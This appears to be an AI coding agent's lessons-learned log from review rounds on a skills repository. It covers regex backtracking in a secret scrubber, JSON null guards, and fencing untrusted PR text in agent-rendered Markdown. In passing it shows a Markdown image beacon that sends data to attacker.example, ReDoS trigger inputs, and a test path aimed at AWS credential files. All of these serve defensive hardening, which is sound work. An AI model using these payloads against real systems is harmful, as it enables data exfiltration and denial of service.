**Signal:** Eva's review found that `scrub.mjs`'s `MALFORMED_QUOTED_VALUE` still consumed its value one character at a time (`[^\r\n]`) while sharing `NEXT_ASSIGNMENT_LOOKAHEAD` with `UNQUOTED_VALUE` — so the lookahead's leading `\s+` was re-attempted at every position of a whitespace run and backtracked across the whole remaining run each time. `PASSWORD="` plus 50k spaces took 5.5s (quadratic; 8k→140ms, 16k→560ms), on input that is untrusted *and not yet truncated*, since `scrub()` caps length LAST by design. This is precisely the cost I had restructured `UNQUOTED_VALUE` to avoid two rounds earlier — and wrote up as [[L-2026-07-31-06]] — then did not carry across when I authored the malformed-quoted branch that reuses the same lookahead.
**Root cause:** Two prior lessons should each have caught this and neither fired, because both were filed under "correctness". [[L-2026-07-31-06]] taught the *technique* (consume whole runs so a per-character lookahead stays linear without a length cap) but I applied it only at its point of discovery, treating it as a fix to one alternative rather than a property the shared lookahead now requires of **every** alternative that embeds it. [[L-2026-07-31-09]]'s force multiplier — "after fixing one instance of a defect class, sweep every other branch of the same expression in the same round" — I did apply, but only to the terminator/stop-set class I was actively being reviewed on; I never re-ran the sweep for the complexity class, because a performance property doesn't announce itself the way a leaked secret does. Tests and 100% coverage are structurally blind here: every fixture is short, so a quadratic and a linear pattern are indistinguishable on the whole suite.
**Apply next time:** When a shared sub-pattern, helper, or invariant is embedded in more than one branch, the moment you change *any* branch to satisfy a property — complexity, allocation, ordering, I/O count, idempotence — enumerate every other embedding site and check the same property there, in the same round. Concretely for regex: any construct where a repetition's body contains a lookahead that itself starts with a quantifier is quadratic by default; the fix is to make the repetition consume maximal atomic runs, and it must be applied everywhere that lookahead appears, not where the bug was reported. Two habits that make this cheap: (1) when a lookahead becomes shared, note at its definition site the contract it imposes on callers ("must be invoked once per run, not once per character"), so the next author of an alternative sees it — a bare `const` shared between branches carries no such signal; (2) pin non-functional properties with a timing regression test at a size where the bad and good forms differ by orders of magnitude (here 5478ms vs <10ms against a loose 1000ms budget), since only an explicit test makes an invisible property visible to the suite. And when the change is "the span/output must be unchanged, only the cost differs", prove it by differential-fuzzing old vs new over generated inputs (200k here, zero diffs) rather than by adding a few more fixtures — an equivalence claim deserves an equivalence test. Related: [[L-2026-07-31-06]], [[L-2026-07-31-09]], [[L-2026-07-31-07]].


## L-2026-07-31-11 — Sweeping siblings for a defect class means re-measuring the property in each branch, not grep-matching the signature you just fixed; and a remedy you rejected once was rejected for a reason with a scope

**Source:** eva-fix-pr run for ievo-ai/skills#520 (branch `eva-impl/493-scrub-multiword-secret-redaction`, round 4)
**Signal:** Round 3 fixed a quadratic in `scrub.mjs`'s `MALFORMED_QUOTED_VALUE` and I filed [[L-2026-07-31-10]] — "sweep every sibling branch for the same non-functional defect class in the same round". I then did sweep, and still shipped a quadratic in the *strict* quoted alternative of the very same regex, which Eva's next review caught: `'PASSWORD="a '.repeat(n)` on one line took 159ms at 24 KB, 620ms at 48 KB, 2500ms at 96 KB. The sweep missed it because I searched for the *signature* I had just fixed — "a repetition whose body embeds a lookahead that starts with a quantifier" — and the strict branch has no lookahead at all. Its quadratic has an entirely different mechanism: an unbounded lazy inner scans to end of line before failing, and the fallback that catches the failure advances the scan position only a couple of characters, so the same futile full-line scan restarts once per assignment. Same property, same regex, same round-3 review, different shape — invisible to a signature search. I also carried round 3's remedy (consume whole atomic runs) as though it were the fix for the class, when it addresses only the re-probing mechanism and cannot help when the cost is one full scan per restart.
**Root cause:** I turned "sweep the siblings" into a syntactic search because that is the cheap version, and a syntactic search can only find recurrences of the mechanism already in hand. A non-functional property is not a code shape; it is a measurement, and the only sound sweep is to cost each branch independently. Compounding it, the correct instrument here — bounding the repetition — was one I had explicitly tried and rejected two rounds earlier on `UNQUOTED_VALUE`, and I had generalised that rejection into "no length caps in this regex" without re-deriving *why* it failed there. It failed because overflowing that cap made the match succeed but shorter, truncating the redacted span and copying the tail through in cleartext — fail-open. In the strict-quoted branch, overflowing a bound makes the alternative *fail*, dropping the value into the redact-to-end-of-line fallback: the same instrument can only ever widen the redaction. Opposite direction of failure, opposite verdict; I had memorised the verdict and dropped the reasoning that produced it. Round 3's pinning habit inherited the same narrowness — I added a timing regression test for the branch I fixed rather than one per alternative, so the suite could not have caught this either, which the reviewer noted directly.
**Apply next time:** (1) When sweeping siblings for a *non-functional* property, measure rather than match: for each branch, construct an input that forces that branch and check the scaling empirically (double the input, watch the time ratio — quadratic announces itself as 4x per doubling). Enumerate the branches first, from the expression's own structure, so the list is complete before you start; a grep for last round's shape is a filter, not a sweep. (2) Ask per branch *what makes the work restart*, not just what makes one pass slow — cost per attempt times number of attempts is the real figure, and a fallback that advances the cursor by a few characters after an O(n) failed attempt is a quadratic even when every individual construct looks linear. (3) Before reusing a past "we tried that and it was wrong" as a constraint, re-derive the argument in the new context — especially its direction of failure. For anything fail-closed by design (a scrubber, a sanitiser, a permission check), a remedy that can only over-apply is categorically different from one that can under-apply, even when it is literally the same construct in the same file. (4) Pin non-functional properties per branch, not per bug: if a regression test exists for one alternative's complexity, the other alternatives need their own, or the property is only pinned where it already failed. Related: [[L-2026-07-31-10]], [[L-2026-07-31-09]], [[L-2026-07-31-06]].


## L-2026-07-31-12 — Enumerating a template's untrusted slots means enumerating its INPUTS too: a value handed in by the dispatch prompt renders exactly like one the agent collected itself

- **Source**: eva-fix-pr run for ievo-ai/skills#524 (branch `eva-impl/522-review-retrospective-excerpt-containment`, cross-repo fix, round 1)
- **Signal**: Eva's REQUEST_CHANGES — "the same Step 4 template's `- Title: <title>` (line 152) is verbatim untrusted PR text — SKILL.md:105 labels it untrusted — rendered on the same chat surface, still unfenced." The port of the excerpt-containment rule into `plugins/ievo/agents/review-retrospective.md` fenced every `Findings` bullet's symptom+evidence excerpt (the values the agent's own Step 1 collects from reviews/comments/threads) and named exactly that one field in all three landing sites — the Step 4 note, the `## Rules` bullet, and the CHANGELOG entry. The report template's `### PR summary` block, four lines above the `Findings` bullets and on the identical two rendering surfaces (the Step 3 chat preview and the Step 4 park file), renders `- Title: <title>` bare. `<title>` is chosen by whoever opened the PR, and the orchestrating skill's own Step 2 already labels the dispatch values "untrusted content the sub-agent will be handling" — so the one slot in the template whose untrustedness was documented in a *different file* was the slot the port missed.
- **Root cause**: I enumerated the destination template's slots by asking "where does the untrusted data this agent gathers end up?", which scopes the sweep to the agent's own collection step (Step 1) and its downstream fields. A slot fed by the **dispatch prompt** fails that question and passes the rendering test: it arrives pre-validated-looking, as a named input in an `## Input` section, sitting in a summary block that reads like metadata rather than content — but its provenance is an arbitrary GitHub contributor, and CommonMark renders `![x](https://attacker.example/beacon.png?d=…)` in `- Title:` exactly as it does in a `Findings` bullet. This is the same defect class as [[L-2026-07-30-01]] (a heading slot is a field even though it has no `Label:`), recurring one PR later on a different agent with a different disguise: there the missed slot was structural markup, here it is an *input* rather than a *collected* value. The generalisation that would have caught both: sweep by SLOT, not by data-flow story.
- **Apply next time**: when porting or authoring a containment/fencing rule, enumerate every `<placeholder>` in the destination template mechanically — grep the template block for `<`…`>` — and for each one ask only two questions: "can text an untrusted party authored reach this slot, by ANY path (collected by this agent, passed in by the dispatcher, echoed from an API field a contributor controls)?" and "does this slot render?" Follow each dispatch-supplied placeholder back to the orchestrating skill's own description of it — `review-retrospective/SKILL.md` Step 2 said "untrusted" in plain words, one grep away — instead of inferring trust from the fact that it was validated enough to be passed as a parameter. Validated-as-*resolvable* (the PR exists, it is merged) is not validated-as-*safe-to-render*. Then state, in the rule itself, which remaining slots are deliberately unfenced and why (here: `url`, `merged_at`, `merge_commit_sha`, the counts — API-shaped, not contributor-authored), so the next porter inherits a closed enumeration rather than an open one. Related: [[L-2026-07-30-01]], [[L-2026-07-29-07]], [[L-2026-07-29-04]].


## L-2026-07-31-13 — Hardening a JSON reader against malformed input starts at the parsed ROOT: `try { JSON.parse }` catches syntax errors only, and a document of exactly `null` is not a syntax error

- **Source**: eva-fix-pr run for ievo-ai/skills#525 (branch `eva-impl/521-scan-repo-hooks-mcp-null-guard`, cross-repo fix, round 1)
- **Signal**: Eva's REQUEST_CHANGES — "`JSON.parse` accepts a bare `null` document, and the parsed root is dereferenced outside the try: `data.hooks ?? {}` (scan_repo.mjs:469) and `data.mcpServers ?? {}` (:508). A `hooks.json`/`.mcp.json` whose entire content is `null` still crashes the scanner with the same uncaught TypeError — one byte from the cases you fixed. `enumerateOnePlugin` shares it (`manifest.author`, :440)." The implementation closed #521 by guarding every *element* it iterated — hook-list entries (`!h || typeof h !== "object"`), the first inner hook, `mcpServers` map values — and shipped 8 regression tests for exactly those shapes. `{"hooks":{"PreToolUse":[null]}}` was fixed; `null` was not. Reproduced in one command: all three functions threw `TypeError: Cannot read properties of null` on a one-word file.
- **Root cause**: I read the `try { data = JSON.parse(...) } catch { return absent }` wrapper as "the root is already handled" and started my threat enumeration one level down, at the members. But that `catch` fires on *syntactically invalid* JSON only, and `null`, `42`, `"x"`, `true` are all perfectly valid JSON documents — the catch never sees them, and the very next statement dereferences the root *outside* the try. The guard I was writing (`!x || typeof x !== "object"` before touching a member) is exactly the guard the root needed; I applied it to every value the parse produced except the one it returned. The container/contents asymmetry is what made it invisible: the elements arrived looking like untrusted data to be validated, while the root arrived looking like an already-validated parse *result*. Same defect class as [[L-2026-07-31-10]]/[[L-2026-07-31-11]] — fixing the instances of a class and leaving the class alive — but the missed sibling here is not a peer branch, it is the enclosing scope, so a sweep of "the other entries" could never have surfaced it.
- **Apply next time**: when adding null/type guards to a function that parses attacker-reachable serialized input, walk the dereference chain outward-in starting from the parse call itself, and guard each link *in source order*: root first, then containers, then elements — the root is a link, not a precondition. Concretely for JSON: `JSON.parse` can return `null`, a number, a string, a boolean, or an array, and only `null` throws on member access, so `!data || typeof data !== "object"` immediately after the `try` block is the whole fix; note that `typeof null === "object"`, which is why the `!data` half is not redundant. Verify by asking what a `try`/`catch` around a parser actually catches — for `JSON.parse` it is grammar violations, never schema violations — rather than treating its presence as coverage. And pin the root case per function with its own test (`null` plus one non-null scalar, so both operands of the `||` are exercised), because a 100%-branch-coverage gate passes happily on a branch that does not exist yet. Related: [[L-2026-07-31-10]], [[L-2026-07-31-11]], [[L-2026-07-13-01]].



## L-2026-08-01-01 — A test fixture using a literal `/home/<user>`-shaped path trips this repo's own machine-local-path-leakage pre-commit hook
- **Source**: eva-implement run for ievo-ai/skills#523
- **Signal**: `pre-commit run --all-files` failed on the first local gate run — the `machine-local-paths` hook flagged `plugins/ievo/scripts/tests/evolution_candidates.test.mjs:95: machine-local path leak: '/home/user' — replace with a placeholder (`<name>`, `$HOME`, `~/`) or add 'machine-local-ok' on the line if intentional.` The offending line was a NEW test asserting `assertTextFileAllowed` rejects an absolute path outside the project (`/home/user/.aws/credentials`), written to illustrate the exact exploit scenario the issue itself named (`~/.aws/credentials`).
- **Root cause**: chose a realistic-looking absolute path literal for the negative-containment test case without checking it against this repo's own doc-safety validators first — the same class of self-inflicted lint trip AGENTS.md's own "Public-repo content safety" section (and evolution-store `[[L-2026-07-29-01]]`, a prior instance of an issue's own example path tripping a doc-lint validator) warns about, just triggered by a *test fixture* string this time rather than prose.
- **Apply next time**: before writing a test fixture or example string containing an absolute filesystem path (`/home/<x>/...`, `/Users/<x>/...`, `C:\Users\<x>\...`), use a placeholder segment (`<name>`) or a repo-relative/synthetic path instead of a plausible-looking real one — this repo's `machine-local-paths` pre-commit hook scans ALL changed lines, including test bodies, not just docs/prose.

## L-2026-08-01-02 — Routing input through an existing shared transform adopts EVERY stage of it, not the one stage you were shopping for; the extra stages are an undocumented product behaviour change

- **Source**: eva-fix-pr run for ievo-ai/skills#527 (branch `eva-impl/523-evolution-candidates-textfile-containment`, cross-repo fix, round 1)
- **Signal**: Eva's REQUEST_CHANGES — "`scrub()` also truncates at MAX_CODEPOINTS=500 and rewrites $HOME paths. Corrections were persisted verbatim before; that's an undocumented capture change (PR says 'redaction pass'). Note it in CHANGELOG + pin with a test."
- **Root cause**: #523 asked for secret redaction on `--text-file` content, `scrub.mjs` already provided it, so I wired in its composite entry point and then named it after the property I had gone looking for — "scrub.mjs's redaction pass" in the header comment, the CHANGELOG entry, and the PR body. `scrub()` is a four-stage pipeline: `redactProviderSecrets` → `redactNamedSecrets` → `rewriteHomePaths` → `truncateScrubbed`. Only the first two are redaction. The other two transform *legitimate, secret-free* input: a correction longer than 500 code points is now stored truncated with a `…[truncated]` marker, and any `$HOME`-absolute path in it is stored `~`-relative — where `--text-file` content had been persisted verbatim before. Both are defensible (they are exactly the transform the sibling failure-capture path already applied), which is precisely why they slipped through undocumented: I evaluated the call site against the threat I was closing, not against the observable output it produces. My new tests asserted only the property I wanted (a `ghp_` token comes back `[REDACTED]`), so neither changed stage had a pin either — a later `scrub.mjs` edit could have moved the persisted shape of every captured correction with the full suite still green.
- **Apply next time**: when a fix routes new input through an existing shared helper, open the helper's composite entry point and enumerate its stages *before* naming it in prose — then classify each stage as "closes the threat" or "changes what non-malicious input looks like on the way out". Every stage in the second class is a product behaviour change that owes a CHANGELOG line and its own regression test, independently of whether it is desirable. Describe the helper by what it does end to end ("`scrub()`: redact + `$HOME` rewrite + 500-code-point cap"), never by the single stage you were shopping for, and key the pins off the helper's own exported constants (`MAX_CODEPOINTS`, `TRUNCATION_MARKER`) so they track it instead of hardcoding today's values. Same family as [[L-2026-07-29-02]] — reusing an existing mechanism copies its whole contract, not the sentence you read it for.

## L-2026-08-01-03 — Narrowing what a CLI flag accepts changes a user-visible contract; the tool's own `--help` is a third surface, ungated and nowhere near the code you edited

- **Source**: eva-fix-pr run for ievo-ai/skills#527 (branch `eva-impl/523-evolution-candidates-textfile-containment`, cross-repo fix, round 1)
- **Signal**: Eva's REQUEST_CHANGES — "HELP_TEXT still documents `--text-file <path>` with no mention of the `.ievo/` restriction."
- **Root cause**: the fix narrowed `--text-file` from "any path this process can read" to "an existing regular file inside `<projectRoot>/.ievo/`, under 256 KB, content scrubbed". I documented that on the two surfaces I was already editing — the module header comment and the `appendCandidate` call site — plus the CHANGELOG. `HELP_TEXT` is a plain `const` ~150 lines above the guard functions, in no code path the diff touched, and the only assertions on it are shape probes (`/append --session/`, `/prune/`); no validator, coupling test, or coverage branch reads its prose. So the one surface a user actually consults at the terminal kept advertising the old, unrestricted `--text-file <path>` — a user hitting the new rejection would read `--help` and find nothing explaining it. Documentation completeness had been judged by "did I explain the change where I was working", which structurally cannot reach a doc string that lives outside the change.
- **Apply next time**: after changing what a CLI flag accepts, `grep -n -- '--<flag>' <script>` and treat every hit outside the function you edited as a doc surface owing an update — usage/`HELP_TEXT` string, module header, README, the skill/agent docs that invoke the script. Then pin the new wording with an assertion in the existing `--help` test, so the next contract change desyncs a test rather than only the user's experience. Trigger to internalise: a narrowed input contract is a user-facing change even when the diff is entirely internal.

## L-2026-08-01-04 — A rebase re-bump fixes the gated version sites; a version number written into PROSE stays stale, and the green version gate is what hides it

- **Source**: eva-fix-pr run for ievo-ai/skills#527 (branch `eva-impl/523-evolution-candidates-textfile-containment`, cross-repo fix, round 1)
- **Signal**: Eva's REQUEST_CHANGES — "Header comment (evolution_candidates.mjs:42) says 'added v0.75.10' — this ships in 0.75.11."
- **Root cause**: `main` advanced twice while the branch was in flight, so the version pick was redone twice (0.75.9 → 0.75.10 → 0.75.11). Each redo was driven by the mechanical signal: the `SCRIPT_VERSION`-vs-`plugin.json` coupling tests and `check-version-bump.mjs`, which between them cover every *coupled* site — the three script constants, `plugin.json`, `marketplace.json`. Both gates went green after the last re-bump and I read that as "the branch is version-consistent". But the same re-bump left a hand-authored sentence in the module header — "`--text-file` is untrusted input (added v0.75.10, closes #523)" — pointing at a version this PR no longer ships as. Nothing couples prose to `plugin.json`, so a green gate is silent about it, and this stale reference was *created* by the very fix-up loop that satisfied the gate.
- **Apply next time**: after any version bump, and again after every re-bump forced by a rebase, run `git diff <base>..HEAD | grep -n '<old-version>'` (and `grep -rn '<old-version>'` over the touched files) before declaring the ceremony done — the coupled-file gate cannot see a version inside a comment, a CHANGELOG sentence, or a doc. Better still, do not hardcode a version in prose you author: reference the issue (`closes #523`) or say "added in this release", so the sentence cannot go stale on the next rebase. Related: [[L-2026-07-31-05]] (grep all coupled `SCRIPT_VERSION` files, never bump from memory), [[L-2026-07-31-02]] (a hand-copied version ships born-stale when the base moves), [[L-2026-07-31-03]] (an ungated duplicated value is a defect class, not an instance).


## L-2026-08-01-05 — A "canonical rule" clause does not make the call sites that ignore it correct; enumerate them and fix the sentences, not just the ones the issue narrative named

- **Source**: eva-fix-pr run for ievo-ai/skills#528 (branch `eva-impl/461-codex-desktop-detection`, round 2)
- **Signal**: Eva's own REQUEST_CHANGES review: "Detection fix is partial: `commands/update.md:193,201` still branches on bare `$CODEX_CLI` (Desktop users still told `/reload-plugins`); `handoff/SKILL.md:122` still reads "`$CODEX_CLI` ONLY", contradicting new Step 1.5. CHANGELOG implies plugin-wide coverage." A `grep -rn CODEX_CLI plugins/` found the rule cited by bare-variable name in **nine** files, two of them with an explicit `ONLY` that inverted the new rule outright — while the CHANGELOG headline read "Detect Codex Desktop sessions across the plugin".
- **Root cause**: the implementer wrote a canonical detection rule (`init/SKILL.md` Step 1.5) that ends with an umbrella clause — "every other `$CODEX_CLI` mention that cites this rule means the combined check, never the bare variable" — and then treated that clause as retroactively fixing the call sites, updating only the four files the issue's own narrative named. But an umbrella clause is invisible to a reader who is *in* `handoff/SKILL.md` acting on the sentence in front of them, and it is powerless against a site that says the opposite ("`$CODEX_CLI` **ONLY**"). Writing the rule is not the same as landing it. This is the third recurrence of the same shape ([[L-2026-07-24-05]], [[L-2026-07-24-06]]): fix exactly what the review named, leave the remaining call sites unexamined, get rejected again next round.
- **Apply next time**: for any change that introduces or narrows a *rule* the rest of a codebase must follow, treat the fix as a two-part deliverable — the rule, plus a filesystem-enumerated per-site pass (`grep -rn <the-symbol>`) applying one written criterion, with a recorded verdict for every hit including the deliberate NOs. Give the criterion a testable shape (here: "a detection sentence names the combined rule; a branch label reads `(Step 1.5: …)`") so a later reader can re-run it. Never lean on a "this clause means X everywhere" sentence as coverage — grep for the direct contradictions (`ONLY`, `alone`, `just`, `unset`) first, since those are strictly worse than an un-updated site. And check the CHANGELOG's own scope claim against `git status`: "across the plugin" in the headline while the Scope bullet lists five files is the drift a reviewer will catch immediately.

## L-2026-08-01-06 — A ready-to-paste snippet in a reference doc must be executed and checked against that same doc's own contract section

- **Source**: eva-fix-pr run for ievo-ai/skills#528 (branch `eva-impl/461-codex-desktop-detection`, round 2)
- **Signal**: Eva's own REQUEST_CHANGES review: the new `.codex/hooks.json` recipe at `codex-hooks.md:70` notified with a bare `echo`, but the same file's § Exit-code semantics (L87-90) defines only exit-0+JSON (parsed as `hookSpecificOutput`/`decision`) or exit-0+no-output, and its worked example (L108-113) used log+bell. The recipe added to close a "configured but never fires" bug would itself have fired and notified nobody.
- **Root cause**: the snippet was authored from the shape of the *problem* ("a Codex user needs a `PostToolUse` entry matching `apply_patch`") without re-reading the contract sections in the very file it was being added to, and without ever running it. `echo` looks like a notification; on a hook whose stdout is protocol, it is a message handed to the model, not the user. The same class of miss hid a second defect only execution could reveal: `printf '\a' > /dev/tty 2>/dev/null` still leaks `cannot create /dev/tty` to stderr with no controlling terminal, because `sh` applies redirections left to right and aborts on the first failure — stderr must be silenced *first*.
- **Apply next time**: when adding a copy-paste config/command snippet to a reference doc, (1) read that doc's own contract/semantics sections and state explicitly which case the snippet lands in, (2) actually run it — parse the JSON with `node -e 'JSON.parse(...)'`, pipe a realistic payload to the extracted command, and assert exit code, stdout, **and stderr** on both the match and no-match paths, plus the degraded environment (`setsid` for no-tty), and (3) when the snippet's whole purpose is to notify a human, name the channel that reaches them and say why the obvious one doesn't. A snippet that has never been executed is a claim, not a recipe.


## L-2026-08-01-07 — A consent claim about sanitized data must be derived from the PRODUCER's record shape and the sanitizer's enumerated stages, never from the sanitizer's name

- **Source**: eva-fix-pr run for ievo-ai/skills#533 (branch `eva-impl/448-contributor-mode-phase1`, cross-repo fix, round 1)
- **Signal**: Eva's own REQUEST_CHANGES review found that both opt-in surfaces this PR added — `feedback/SKILL.md` Step 3.9's `Attach` option description and `contributor-mode-on/SKILL.md` Step 2's consent manifest — told the user the attachable tool-failure records carry "no secrets, no raw file contents". They can carry raw file contents. The producing hook (`evo-auto-enable/SKILL.md` Step 3.6) builds every record as `jq -c '{event, tool, outcome, detail: {error, tool_input}}'`, so a denied `Write`/`Edit` records that call's own `content`/`new_string` — literal file text — and `scrub.mjs` only redacts provider-shaped secret VALUES and `NAME=value` assignments, rewrites `$HOME` paths, and truncates to 500 code points. It strips no code and no file content. The PR was 40 lines away from contradicting itself: the same Step 3.9's own "Fence containment" note (added by this PR's `/ievo:deep-review` pass) already stated the accurate characterization — "already passed through `scrub.mjs`'s secret/path/length transform but NOT through any Markdown-neutralizing step" — i.e. the exact stage list was known and written down in the same file, and the consent bullet above it was never reconciled against it.
- **Root cause**: the consent copy was derived from the sanitizer's NAME and PURPOSE ("it's the privacy scrub, so the output is private") rather than from the two things that actually determine the payload: (1) what the upstream producer puts into the record, and (2) which transforms the sanitizer enumerably performs. Both were readable in this same repo — the hook's `jq` filter and `scrub.mjs`'s own header comment listing its four stages — and neither was consulted while writing a user-facing NEGATIVE guarantee. A negative claim ("no X is included") is strictly stronger than the positive one the code supports ("X was passed through a redaction step"), and the gap between them is exactly the informed-consent defect: the user opts in to a payload the copy told them cannot exist.
- **Apply next time**: when writing consent/privacy copy for data that reaches a public surface through a sanitizer, derive every claim from the PRODUCER's record shape plus the sanitizer's enumerated stages, and prefer stating what the sanitizer does NOT do alongside what it does. Concretely: read the code that constructs the record (which fields, from which hook payload) and the sanitizer's own stage list, then write the copy as "redacts A, rewrites B, truncates to C — it does not remove D", never "already scrubbed — no D". Then grep the SAME file for every other sentence describing the same payload: a file that characterizes the data accurately in one place (a containment note, a security caveat) and loosely in another is self-contradicting, and the loose sentence is the one users read before consenting. Related: [[L-2026-08-01-02]] (routing input through an existing shared transform adopts every stage of it — the converse blind spot, where the stage list was likewise never enumerated before the behaviour was described).


## L-2026-08-01-08 — Replacing a per-entity-keyed path with one shell variable silently drops the keying; in an agent-instruction doc a `$VAR` has no lifetime across tool calls or parallel per-target work

- **Source**: eva-fix-pr run for ievo-ai/skills#534 (branch `eva-impl/532-update-md-mktemp-staging`, round 1) — Eva REQUEST_CHANGES on Eva's own PR.
- **Signal**: the PR closed a CWE-59 symlink-pre-planting hole in `/ievo:update` by swapping the predictable `/tmp/ievo-update-staged-<name>*` / `-localcopy-<name>*` staging paths for `STAGE_DIR=$(mktemp -d)`. The review found the security fix correct but the *lifetime* wrong: `update.md` Step 2.5 dispatches every changed target's audit in one parallel message and Step 3.5 cleans up per target, so on a multi-target run the second target's `mktemp -d` shadows the first's — target 1's staging dir, possibly holding content the auditor just flagged RED, is never removed. The old fixed names were attackable but *inherently per-target*, because `<name>` was baked into them; the new one-variable form was neither.
- **Root cause**: the security property (unpredictable path) and the lifetime property (one live path per target) were carried by the SAME identifier, and the fix optimised only the first. The replaced construct's `<name>` keying was doing invisible work — binding each path to its target — and swapping in a single mutable variable dropped that binding with no diff-visible signal, because both forms read as "the staging path" at every use site. Compounding it: `update.md` is a prompt for an agent, not a shell script; each Bash call is a fresh process, so `$STAGE_DIR` never survives from Step 2 to Steps 2.5/3.5 even for a *single* target. The implementer read the neighbouring `CHECKOUT_DIR=$(mktemp -d)` as a precedent to copy, but `CHECKOUT_DIR`'s uses sit inside one target's own sequential fetch, so its narrower lifetime happened to hold.
- **Apply next time**: when a fix replaces an identifier that encodes a per-entity key (`<name>`, an id, an index) with a generated or anonymous one, enumerate every property the old key carried — uniqueness, cleanup pairing, log correlation — and re-establish each explicitly; fixing the property that motivated the change is not the whole job. And in a document that *instructs an agent* rather than executing, a `$VAR` is only a naming convention with no runtime: state where the value is recorded (echo it, bind it to that target's `<name>`) and use the recorded literal at every later use site, since neither a fresh Bash shell nor a Task/Write tool parameter will expand it. Check the fan-out shape of the enclosing step first — "for each target", "in a single message", "in parallel" all signal that per-iteration state cannot live in one variable. Related: [[L-2026-07-31-10]].


## L-2026-08-01-09 — A mitigation ported verbatim from a sibling carries its wording, not its surface assumptions: a Markdown code span contains inline constructs only, so it does not fence a value rendered into a GFM table cell

- **Source**: eva-fix-pr run for ievo-ai/skills#535 (branch `eva-impl/531-inspect-excerpt-containment`, round 1) — Eva REQUEST_CHANGES on Eva's own PR.
- **Signal**: the PR closed a CWE-79 Markdown-injection gap in `/ievo:inspect` Step 5 by porting `security-check/SKILL.md`'s "Excerpt containment" rule — wrap each untrusted value in an inline code span fenced with a backtick run one longer than the longest run inside the value. The review found the port faithful but *insufficient on the destination surface*: most of inspect's Step 5 template is GFM **tables**, and GFM splits a row into cells on unescaped `|` **before** inline parsing (spec § Tables (extension), example 200: "include a pipe in a cell's content by escaping it, including inside other inline spans"). So `description: x | ![b](u)` wrapped in backticks still renders as two cells with a live image in the second — the exact injection the rule claimed to close. A line break in a value likewise breaks its row, or (in the README summary paragraph) terminates the code span at the blank line, spilling the remainder as live Markdown.
- **Root cause**: the port was verified for *fidelity* (does the destination now say what the sibling says, and does the sibling carry a companion rule this one dropped?) but never re-derived for *sufficiency* (is this mitigation still complete given where the destination actually renders?). `security-check`'s rule guards a GitHub **issue body** — free-flowing prose where the code span IS the outermost parse boundary, so fencing alone holds. `inspect` renders into table rows, a container parsed BEFORE inlines, so the code span is no longer the outermost boundary and cannot contain anything the row-splitter sees first. The two surfaces read identically at the level of "untrusted text rendered as Markdown", which is exactly why the mismatch was invisible in the diff. Compounding it: the CHANGELOG entry showed the implementer explicitly checking the *previous* known port failure mode ([[L-2026-07-30-02]] — a dropped companion "takes precedence" rule) and finding it clean, which felt like the port had been audited when only one of its two failure modes had been.
- **Apply next time**: when porting a security mitigation between components, enumerate the DESTINATION's rendering/parsing surfaces first (chat Markdown, issue body, table cell, list item, blockquote, JSON field, shell argument) and re-derive that the mitigation is *sufficient* there — carrying the sibling's wording faithfully is necessary, never sufficient, and "the sibling had no companion rule to drop" answers a different question. For Markdown containment specifically: a code span neutralizes INLINE constructs only; every container parsed before inlines must be neutralized separately — escape `|` as `\|` for GFM table cells (row parsing restores the literal, so verbatim rendering is preserved; do not escape outside a table, where the backslash would render), and collapse CR/LF runs to spaces since a table row is single-line and a code span cannot cross a blank line. State the normalization ORDER explicitly (truncate → collapse → escape → measure the backtick run → wrap), because measuring the fence before the transforms that change the text is its own bug. Related: [[L-2026-07-30-02]].


## L-2026-08-01-10 — Porting a sibling skill's containment rule inherits that sibling's rendering surface, not the destination template's — enumerate the destination's OWN interpolation points

- **Source**: eva-fix-pr run for ievo-ai/skills#535 (branch `eva-impl/531-inspect-excerpt-containment`)
- **Signal**: Eva's own REQUEST_CHANGES review judged the ported "Excerpt containment" rule correct in mechanism (variable-length backtick fencing, the GFM example-200 pipe-escape, line-break collapsing, the truncate→collapse→escape→measure→wrap order) but under-inclusive in *scope*: it enumerated the summary paragraph plus the four Plugin/Skill/Agent/Command tables, while `inspect/SKILL.md` Step 5's template also interpolates unvetted repo content into the Scripts list (tree-derived `<path>` + the script's first comment line), the Hooks list (`hooks.json` event keys and commands), the MCP Servers list (`.mcp.json` server names / transport types), the Permission Footprint (aggregated `allowed-tools` strings), and the `> **Note:** <skill-name> requests broad access` blockquote. Fencing only the enumerated surfaces relocates the injection payload instead of containing it — the review's words: "the payload just moves there."
- **Root cause**: the port was scoped by reading the SOURCE rule (`security-check/SKILL.md`, whose rendering surface is a single `Excerpt:` line in a filed GitHub issue) and by reading the destination's most *visually salient* structures (the four Markdown tables, which dominate the template). Neither pass was a systematic walk of the destination template's own placeholders top to bottom. A containment rule's correctness has two independent axes — the neutralization mechanism, and the set of values it is declared to apply to — and porting a sibling only transfers the first. The sibling has nothing to say about the second, because its template is not this template.
